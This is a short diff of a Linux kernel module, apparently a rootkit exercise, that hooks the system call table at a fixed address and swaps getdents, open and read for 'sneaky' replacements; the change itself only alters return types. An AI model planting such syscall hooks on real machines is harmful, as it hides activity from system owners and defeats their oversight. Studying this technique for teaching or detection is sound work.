@@ -52,7 +52,7 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 //This is used for all system calls.
 asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
 asmlinkage long (*original_open)(const char *filename, int flags, int mode);
-asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+asmlinkage long (*original_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
@@ -92,8 +92,8 @@ asmlinkage long sneaky_sys_open(const char *filename, int flags, int mode) {
   return (*original_open)(filename, flags, mode);
 }
 
-asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
-  ssize_t value = (*original_read)(fd, buf, count);
+asmlinkage long sneaky_sys_read(int fd, void *buf, size_t count) {
+  long value = (*original_read)(fd, buf, count);
   return value;
   
 }
